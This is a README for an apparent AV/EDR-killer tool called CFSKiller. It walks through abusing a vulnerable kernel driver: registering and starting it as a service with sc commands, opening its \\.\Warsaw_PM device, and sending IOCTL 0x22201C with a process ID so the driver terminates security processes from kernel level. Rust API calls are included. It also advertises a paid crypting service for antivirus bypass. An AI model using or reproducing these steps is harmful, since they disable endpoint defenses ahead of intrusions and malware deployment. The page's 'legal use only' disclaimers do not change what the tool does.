# CFSKiller
av/edr killer

The vulnerability is activated through the IOCTL 0x22201C code with a 1036 byte buffer, where the first 4 bytes contain the target process identifier in DWORD format. The vulnerable driver, having received this malicious IOCTL through DeviceIoControl, calls the imported function ZwTerminateProcess, providing any application in user mode with the ability to terminate processes at the kernel level.

Launch cmd.exe with Administrator privileges, and register a kernel driver service with type "kernel" and binPath pointing to the vulnerable driver's location.

> sc create MalDriver binPath= <path> type= kernel`
> sc start MalDriver

Once loaded, the driver creates a symbolic link for user-mode accessible as \.\Warsaw_PM. Which we can use to get a handle to the driver device using the CreateFileW API call.

> CreateFileW(device_name.as_ptr(), GENERIC_READ | GENERIC_WRITE, 0, ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut())
To send the Malicious IOCTLs we will use DeviceIoControl with code 0x22201C, and buffer containing a PID in its first 4 bytes

> DeviceIoControl(self.hDriver, 0x22201C, buffer.as_mut_ptr() as LPVOID, buffer.len(), ptr::null_mut(), 0, &mut bytes_returned, ptr::null_mut())

<p align="center">
  <i>
    <br>(A public collection of open resources for AV/EDR  (only legal use in Red Team and penetration testing).
</i>
  <br>
</p>

Channel cfs (av/edr/xdr bypass) [Info](https://t.me/cfs_restore) | follow us on [Twitter](https://twitter.com/EvilWhales) | Discord SERVER xCommunity CFS the [CFS - CRYPT FILE SERVICE](https://subscord.com/store/1429699829856075869/checkout/3V9ZXyco-ODEz) | Telegram [Contact](https://t.me/cfs0x)

### Legal Disclaimer:

All tools and resources are provided for ethical and legal use only, such as authorized penetration testing and security research. Illegal activities, or any consequences arising from improper application of these tools. Users are solely accountable for ensuring compliance with all applicable laws and regulations.

### Contributing
Contributions are welcome! If you have ideas for improving configurations or adding new templates, please submit a pull request. Ensure all contributions align with the educational and ethical goals of this project.

### Disclaimer of liability:

To the maximum extent permitted by applicable law, we will not be liable for any indirect, incidental, special, consequential, or punitive damages or any loss of profits or income incurred directly or indirectly, or any loss of data, usage, business reputation, or other non-material damages resulting from (i) your access to this resource and/or inability to access this resource; (ii) any behavior or content of any third party referenced by this resource, including without limitation any defamatory, offensive or illegal behavior of other users or third parties; (iii) any content obtained from this resource.
